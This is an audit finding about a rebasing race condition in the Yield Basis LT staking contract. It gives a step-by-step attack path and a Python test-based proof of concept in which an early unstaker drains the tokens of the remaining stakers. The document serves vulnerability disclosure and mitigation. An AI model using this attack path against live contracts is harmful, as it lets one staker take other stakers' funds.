# H-1: Staker Balance Rebase Vulnerability in LT Contract

## Summary
Summary:

A vulnerability has been found in the LT contract where stakers can avoid token rebasing by unstaking tokens before positive value changes are applied. This is due to a delayed update of staker balances in the contract, creating a race condition. This allows stakers to escape rebasing at the expense of other users. A test case has been provided to demonstrate the vulnerability and the impact is that losses are socialized among remaining stakers. The protocol team has fixed this issue in their code.

## Details
Source: https://github.com/sherlock-audit/2025-08-yield-basis-judging/issues/192 

## Found by 
KupiaSec, blockace, montecristo, talfao

### Summary
The LT contract has a vulnerability where stakers can avoid token rebasing by unstaking tokens before positivie value changes are applied. The `balanceOf` state for stakers is not updated until `_calculate_values` is called, creating a race condition that allows stakers to escape token rebasing at the expense of other users.

### Root Cause
The vulnerability stems from the delayed balance updates for stakers in the LT contract. When positive value changes occur, the staker's `balanceOf` is not immediately updated. Instead, it only gets updated when functions that call `_calculate_values` are executed.

So when withdrawing tokens from the staker, the actual `balanceOf[staker]` update only happens in functions like [`_transfer`](https://github.com/sherlock-audit/2025-08-yield-basis/blob/main/yb-core/contracts/LT.vy#L876-L921) when the staker interacts with the contract.

### Internal pre-conditions
- Users have staked LT tokens to the staking contract

### External pre-conditions
- LP Price increases from swap activities in the cryptopool

### Attack Path

1. **Setup Phase**: Total supply is 1000, staked tokens is 500, total value is 1000, staked value is 500, ideal staked value is 500. Among 500 staked tokens, 250 tokens are owned by Alice and 250 tokens are owned by Bob, each owning 250 shares. Everything matches 1:1 ratio.
2. LP Price increases, causing positive value changes in the LT contract, e.g. 500 positive value accrued.
3. Now, total value is increased to 1500 while staked value should maintain 500, so the staked balance should be rebased to match 3:1 ratio, which will be reducing 250 tokens to make: Total Supply = 750, Staked Tokens = 250, Ratio: 3:1.
4. Alice unstakes her 250 shares from the staking contract, when `withdraw` or `redeem` is called, the `balanceOf[staker]` is still 500, returning 250 tokens to Alice for 250 shares.
5. During transfer, in `_transfer` function, the rebalance occurs, making `balanceOf[staker]` to be 250.
6. Alice takes 250 tokens, so at the end of Alice's unstaking, `balanceOf[staker]` will be zero.
7. Bob has 250 shares but total staked tokens is 0, so Bob loses all his tokens.

### PoC
Here's a test case that demonstrates the vulnerability:

```python
import boa
import logging

import pytest

UNIT = 10**18

def test_audit_stake_loss(cryptopool, yb_lt, yb_amm, yb_staker, collateral_token, stablecoin, cryptopool_oracle,
                yb_allocated, seed_cryptopool, accounts, admin):
    user1 = accounts[0]
    user2 = accounts[1]

    # User1 deposits to LT and stakes to staker
    with boa.env.prank(user1):
        collateral_token._mint_for_testing(user1, UNIT)
        yb_lt.deposit(UNIT, UNIT * 100_000, 0)
        logging.info("User1 Balance: " + str(yb_lt.balanceOf(user1)))
        yb_staker.deposit(UNIT // 2, user1)

    # User2 deposits to LT and stakes to staker
    with boa.env.prank(user2):
        collateral_token._mint_for_testing(user2, UNIT)
        yb_lt.deposit(UNIT, UNIT * 100_000, 0)
        logging.info("User2 Balance: " + str(yb_lt.balanceOf(user2)))
        yb_staker.deposit(UNIT // 2, user2)
    
    logging.info("PricePerShare: " + str(yb_lt.pricePerShare()))
    logging.info("LP Price: " + str(cryptopool.lp_price()))

    # LP Price Up
    with boa.env.prank(admin):
        stablecoin._mint_for_testing(admin, 200_000 * UNIT)
        amt = 200_000 * UNIT
        for _ in range(10):
            amt = cryptopool.exchange(0, 1, amt, 0)
            amt = cryptopool.exchange(1, 0, amt, 0)

    logging.info("--------------------------------")
    logging.info("PricePerShare: " + str(yb_lt.pricePerShare()))
    logging.info("LP Price: " + str(cryptopool.lp_price()))

    # User1 unstakes from staker
    with boa.env.prank(user1):
        balance_pre = yb_lt.balanceOf(user1)
        yb_staker.redeem(yb_staker.balanceOf(user1), user1, user1)
        logging.info("User1 Redemed: " + str(yb_lt.balanceOf(user1) - balance_pre))

    # User2 unstakes from staker
    with boa.env.prank(user2):
        balance_pre = yb_lt.balanceOf(user2)
        yb_staker.redeem(yb_staker.balanceOf(user2), user2, user2)
        logging.info("User2 Redemed: " + str(yb_lt.balanceOf(user2) - balance_pre))

```

### Impact
This vulnerability allows stakers to avoid token rebasing during positive value changes by unstaking tokens before the balance rebase occurs, effectively socializing losses among remaining stakers.

###  Mitigation
The `balanceOf` function should be defined to reflect the actual rebased balance of the staker in real-time.
